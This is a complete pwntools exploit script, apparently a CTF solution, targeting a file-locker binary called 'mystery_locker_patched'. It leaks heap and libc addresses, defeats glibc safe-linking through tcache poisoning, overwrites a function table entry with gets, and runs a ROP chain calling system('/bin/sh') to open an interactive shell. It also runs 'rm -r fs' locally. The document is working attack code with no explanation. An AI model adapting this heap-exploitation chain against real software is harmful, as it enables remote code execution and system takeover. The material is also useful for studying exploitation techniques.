#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 127.0.0.1 --port 4000

# dont forget to: patchelf --set-interpreter /tmp/ld-2.27.so ./test
# dont forget to set conext.arch. E.g amd64

from pwn import *
import os

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './mystery_locker_patched'
# context.terminal = ['tmux', 'new-window']
argv = []
#env = {'LD_PRELOAD':'./libc.so.6'}
env = {}
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

def create(fname, content, csz, fsz= 0):
    io.sendlineafter(b">", str(0).encode())
    if fsz > 0:
        io.sendlineafter(b"size:", str(fsz).encode())
    else:
        io.sendlineafter(b"size:", str(len(fname)).encode())
    io.sendlineafter(b"name: ", fname)
    io.sendlineafter(b"len: ", str(csz).encode())
    io.sendlineafter(b"contents: ", content)

def reanme(fname):
    io.sendlineafter(b">", str(1).encode())
    io.sendlineafter(b"size:", str(len(fname)).encode())
    io.sendlineafter(b"name: ", fname)

def show(fname,fsz=0):
    io.sendlineafter(b">", str(2).encode())
    if fsz > 0:
        io.sendlineafter(b"size:", str(fsz).encode())
    else:
        io.sendlineafter(b"size:", str(len(fname)).encode())
    io.sendlineafter(b"name: ", fname)

def remove(fname, fsz=0):
    io.sendlineafter(">", str(3).encode())
    if fsz > 0:
        io.sendlineafter(b"size:", str(fsz).encode())
    else:
        io.sendlineafter(b"size:", str(len(fname)).encode())
    io.sendlineafter(b"name: ", fname)

def mask(p, l):
    return p ^ (l >> 12) 

def unmask(p, l):
    return mask(p, l)

def new_ptr_addr(next_addr):
    sz = 0x40

    while sz < 0x400:
        masked = mask(next_addr+sz, next_addr)
        lb = masked & 0xff
        masked = (masked >> 16) << 16
        masked += lb

        new_addr = unmask(masked, next_addr)

        if new_addr > next_addr:
            print(f"New addr: {hex(new_addr)} sz: {sz}")
            return sz, new_addr

        sz += 0x10

    return 0, 0

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
# pwndbg tele command
gdbscript = '''
b* main
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# max size = 0x400
os.system("rm -r fs")

io = start(argv, env=env)

create(b"a", b"A\x00", 0x10)
remove(b"a")
create(b"a", b"\x00", 0x10)

show(b"a")
leak = io.recvuntil(b"C")[-6:-1]
leak = leak.ljust(0x8, b'\x00')
leak = u64(leak) << 12

heap_base = leak
print("Heap base: ", hex(leak))

chunk_addr = heap_base + 0x310 + 0x820
print("Next chunk addr: ", hex(chunk_addr))

sz, new_addr = new_ptr_addr(chunk_addr)

if sz == 0x0:
    exit(0)

create(b"c\x00", b"\x00", 0x400, 0x400)
create(b"b\x00", b"\x00", sz-0x8, sz-0x8)

remove(b"c\x00", 0x821)

next_addr = chunk_addr + sz*2

if new_addr - next_addr > 0x10000:
    exit(0)

remove(b"z\x00", 0x400)
remove(b"z\x00", 0x18)
remove(b"z\x00", 0x18)
print("Allocating until next is overlap")
while next_addr < new_addr - 0x40:
    if not args.LOCAL:
        print("Tick")
    if new_addr - next_addr > 0x440:
        remove(b"z\x00", 0x400-8)
        next_addr += 0x400
    else:
        remove(b"z\x00", 0x18)
        next_addr += 0x20

payload = b"A"*0x18
payload += p16(0x501)
create(b"n\x00",  payload + b"\x00", 0x100)

remove(b"z\x00", 0x38)
create(b"la\x00", b"\x00",0x400, 0x400)
remove(b"z\x00", 0x400)
remove(b"z\x00", 0x400)
create(b"m", b"\x00", 0x38)

create(b"d", b"\x00", 0x400)

show(b"d")
leak = io.recvuntil(b"C")[-6:-1]
leak = leak.ljust(0x8, b'\x00')
leak = u64(leak) << 8

libc.address = leak - 0x1f7100

print("Libc leak: ", hex(libc.address))

func_table = heap_base + 0x2a0

print("Func table: ", hex(func_table))

create(b"e\x00", b"\x00", 0x400, 0x400)

print("Next addr: ", hex(next_addr))
payload = b"B"*0x20
payload += p64(mask(func_table-0x10, next_addr+0x40))
payload = payload[:-1]
create(b"f", payload, 0x100)

remove(b"g\x00", 0x400)

payload = b"A"*0x10
payload += p64(libc.sym['gets'])[:-1]

remove(payload, 0x400)
create(b"h", b"A\x00", 0x40)

io.sendlineafter(b">", str(4).encode())

rop = ROP(libc)
off = 0x540-0x18
payload = b"A"*off
payload += p64(rop.rdi.address)
payload += p64(next(libc.search(b"/bin/sh\x00")))
payload += p64(rop.ret.address)
payload += p64(libc.sym['system'])

io.sendline(payload)

# gdb.attach(io, gdbscript)
io.interactive()
